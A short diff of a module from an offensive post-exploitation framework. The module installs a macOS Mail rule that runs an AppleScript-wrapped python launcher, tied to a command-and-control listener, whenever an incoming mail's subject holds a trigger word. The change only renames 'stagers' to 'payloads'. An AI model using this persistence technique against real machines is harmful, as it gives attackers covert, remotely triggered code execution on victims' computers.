@@ -14,7 +14,7 @@ class Module:
             'Author': ['@n00py'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs a mail rule that will execute an AppleScript stager when a trigger word is present in the Subject of an incoming mail.'),
+            'Description': ('Installs a mail rule that will execute an AppleScript payload when a trigger word is present in the Subject of an incoming mail.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -97,7 +97,7 @@ class Module:
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
         launcher = launcher.replace('"', '\\"')
         launcher = launcher.replace('"', '\\"')
         launcher = "do shell script \"%s\"" % (launcher)
